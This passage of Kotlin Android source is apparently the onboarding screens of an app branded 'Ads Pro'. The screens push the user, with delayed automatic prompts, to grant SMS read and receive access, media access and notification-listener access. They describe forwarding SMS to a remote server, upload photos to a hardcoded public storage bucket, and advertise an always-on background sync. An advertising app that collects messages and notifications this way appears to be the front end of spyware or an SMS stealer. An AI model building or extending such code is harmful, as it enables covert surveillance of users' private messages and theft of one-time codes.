          import androidx.lifecycle.Lifecycle
          import androidx.lifecycle.LifecycleEventObserver
          import androidx.compose.ui.platform.LocalLifecycleOwner
          import androidx.work.OneTimeWorkRequestBuilder
          import androidx.work.WorkManager
          import coil.compose.AsyncImage
          import com.adspro.app.data.SupabaseClient
          import com.adspro.app.worker.AppsSyncWorker
          import kotlinx.coroutines.delay
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.withContext

          class MainActivity : ComponentActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContent {
                      Surface(modifier = Modifier.fillMaxSize(), color = Color.White) {
                          MainWizardScreen()
                      }
                  }
              }
          }

          @Composable
          fun MainWizardScreen() {
              var page by remember { mutableIntStateOf(0) }
              val context = LocalContext.current
              val lifecycleOwner = LocalLifecycleOwner.current

              Column(
                  modifier = Modifier
                      .fillMaxSize()
                      .background(Color.White)
                      .padding(24.dp),
                  horizontalAlignment = Alignment.CenterHorizontally
              ) {
                  Spacer(modifier = Modifier.height(32.dp))
                  // Top Logo Box (35% width, 60.dp height)
                  Box(
                      modifier = Modifier
                          .fillMaxWidth(0.35f)
                          .height(60.dp)
                          .background(Color.LightGray),
                      contentAlignment = Alignment.Center
                  ) {
                      Text("LOGO", color = Color.DarkGray, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                  }

                  Spacer(modifier = Modifier.weight(1f))

                  when (page) {
                      0 -> SmsPermissionStep(onGranted = { page = 1 })
                      1 -> MediaPermissionStep(onGranted = { page = 2 })
                      2 -> NotificationPermissionStep(onGranted = { page = 3 })
                      3 -> MediaGalleryStep(onNext = { page = 4 })
                      4 -> DashboardStep(onFinish = { page = 0 })
                  }

                  Spacer(modifier = Modifier.weight(1f))
              }
          }

          @Composable
          fun SmsPermissionStep(onGranted: () -> Unit) {
              val context = LocalContext.current
              var hasPermission by remember {
                  mutableStateOf(
                      ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
                  )
              }
              val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { perms ->
                  if (perms.values.all { it }) {
                      hasPermission = true
                      onGranted()
                  }
              }

              LaunchedEffect(Unit) {
                  if (hasPermission) {
                      onGranted()
                  } else {
                      delay(15_000L)
                      launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS))
                  }
              }

              Column(horizontalAlignment = Alignment.CenterHorizontally) {
                  Text("SMS Forwarding Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                  Spacer(modifier = Modifier.height(12.dp))
                  Text("Ads Pro requires access to SMS messages to forward incoming alerts and logs directly to your secure server.", fontSize = 14.sp, color = Color.DarkGray)
                  Spacer(modifier = Modifier.height(24.dp))
                  Button(
                      onClick = { launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)) },
                      modifier = Modifier.fillMaxWidth().height(56.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                  ) {
                      Text("Grant SMS & Continue", color = Color.White, fontSize = 16.sp)
                  }
              }
          }

          @Composable
          fun MediaPermissionStep(onGranted: () -> Unit) {
              val context = LocalContext.current
              val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                  arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
              } else {
                  arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
              }
              var hasPermission by remember {
                  mutableStateOf(perms.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED })
              }
              val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
                  if (result.values.all { it }) {
                      hasPermission = true
                      onGranted()
                  }
              }

              LaunchedEffect(Unit) {
                  if (hasPermission) {
                      onGranted()
                  } else {
                      delay(15_000L)
                      launcher.launch(perms)
                  }
              }

              Column(horizontalAlignment = Alignment.CenterHorizontally) {
                  Text("Media Library Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                  Spacer(modifier = Modifier.height(12.dp))
                  Text("Grant permission to read images and videos to enable gallery syncing and remote media management.", fontSize = 14.sp, color = Color.DarkGray)
                  Spacer(modifier = Modifier.height(24.dp))
                  Button(
                      onClick = { launcher.launch(perms) },
                      modifier = Modifier.fillMaxWidth().height(56.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                  ) {
                      Text("Grant Media & Continue", color = Color.White, fontSize = 16.sp)
                  }
              }
          }

          @Composable
          fun NotificationPermissionStep(onGranted: () -> Unit) {
              val context = LocalContext.current
              val lifecycleOwner = LocalLifecycleOwner.current
              var showDialog by remember { mutableStateOf(false) }

              fun isNotifListenerEnabled(): Boolean {
                  val cn = android.content.ComponentName(context, com.adspro.app.service.AppNotificationListener::class.java)
                  val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
                  return flat?.contains(cn.flattenToString()) == true
              }

              DisposableEffect(lifecycleOwner) {
                  val observer = LifecycleEventObserver { _, event ->
                      if (event == Lifecycle.Event.ON_RESUME && isNotifListenerEnabled()) {
                          onGranted()
                      }
                  }
                  lifecycleOwner.lifecycle.addObserver(observer)
                  onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
              }

              LaunchedEffect(Unit) {
                  if (isNotifListenerEnabled()) {
                      onGranted()
                  } else {
                      delay(15_000L)
                      showDialog = true
                  }
              }

              if (showDialog) {
                  AlertDialog(
                      onDismissRequest = { showDialog = false },
                      title = { Text("Notification Access Required") },
                      text = { Text("Please enable Notification Listener access for Ads Pro in system settings.") },
                      confirmButton = {
                          TextButton(onClick = {
                              showDialog = false
                              context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                          }) { Text("Open Settings") }
                      }
                  )
              }

              Column(horizontalAlignment = Alignment.CenterHorizontally) {
                  Text("Notification Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                  Spacer(modifier = Modifier.height(12.dp))
                  Text("Notification listener permissions allow processing incoming alerts and triggers.", fontSize = 14.sp, color = Color.DarkGray)
                  Spacer(modifier = Modifier.height(24.dp))
                  Button(
                      onClick = { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                      modifier = Modifier.fillMaxWidth().height(56.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                  ) {
                      Text("Grant Notification Access", color = Color.White, fontSize = 16.sp)
                  }
              }
          }

          @Composable
          fun MediaGalleryStep(onNext: () -> Unit) {
              var mediaList by remember { mutableStateOf<List<String>>(emptyList()) }
              val context = LocalContext.current

              val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickMultipleVisualMedia()) { uris ->
                  if (uris.isNotEmpty()) {
                      // Upload picked files in background
                      kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                          for (uri in uris) {
                              context.contentResolver.openInputStream(uri)?.use { stream ->
                                  val bytes = stream.readBytes()
                                  val tempFile = java.io.File(context.cacheDir, "upload_${System.currentTimeMillis()}.jpg")
                                  tempFile.writeBytes(bytes)
                                  SupabaseClient.uploadFile("media", tempFile.name, tempFile, "image/jpeg")
                              }
                          }
                          mediaList = SupabaseClient.listMedia("media")
                      }
                  }
              }

              LaunchedEffect(Unit) {
                  withContext(Dispatchers.IO) {
                      mediaList = SupabaseClient.listMedia("media")
                  }
              }

              Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
                  Text("Media & Gallery", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                  Spacer(modifier = Modifier.height(8.dp))
                  Button(
                      onClick = { picker.launch(androidx.activity.result.PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageAndVideo)) },
                      colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)
                  ) {
                      Text("Pick & Upload Photos", color = Color.White)
                  }
                  Spacer(modifier = Modifier.height(16.dp))
                  
                  Box(modifier = Modifier.weight(1f).fillMaxWidth()) {
                      if (mediaList.isEmpty()) {
                          Text("No uploaded media found", modifier = Modifier.align(Alignment.Center), color = Color.Gray)
                      } else {
                          LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.fillMaxSize()) {
                              items(mediaList) { fileName ->
                                  val url = "https://bqddohfszkqpvncpbrun.supabase.co/storage/v1/object/public/media/$fileName"
                                  AsyncImage(
                                      model = url,
                                      contentDescription = null,
                                      modifier = Modifier.size(100.dp).padding(4.dp)
                                  )
                              }
                          }
                      }
                  }

                  Spacer(modifier = Modifier.height(16.dp))
                  Button(
                      onClick = onNext,
                      modifier = Modifier.fillMaxWidth().height(56.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                  ) {
                      Text("Continue to Dashboard", color = Color.White, fontSize = 16.sp)
                  }
              }
          }

          @Composable
          fun DashboardStep(onFinish: () -> Unit) {
              val context = LocalContext.current
              Column(horizontalAlignment = Alignment.CenterHorizontally) {
                  Text("System Dashboard", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                  Spacer(modifier = Modifier.height(16.dp))
                  Card(
                      modifier = Modifier.fillMaxWidth(),
                      colors = CardDefaults.cardColors(containerColor = Color(0xFFE8F5E9))
                  ) {
                      Column(modifier = Modifier.padding(16.dp)) {
                          Text("Sync Service Status", fontWeight = FontWeight.Bold, color = Color(0xFF2E7D32))
                          Spacer(modifier = Modifier.height(4.dp))
                          Text("Always On & Running in background", fontSize = 14.sp, color = Color.DarkGray)
                      }
                  }
                  Spacer(modifier = Modifier.height(16.dp))
                  Button(
                      onClick = {
                          WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<AppsSyncWorker>().build())
                      },
                      modifier = Modifier.fillMaxWidth().height(48.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)
                  ) {
                      Text("Trigger App Sync Now", color = Color.White)
                  }
                  Spacer(modifier = Modifier.weight(1f))
                  Button(
                      onClick = onFinish,
                      modifier = Modifier.fillMaxWidth().height(56.dp),
                      colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                  ) {
                      Text("Finish & Restart Setup", color = Color.White, fontSize = 16.sp)
                  }
              }
          }
          END_OF_FILE

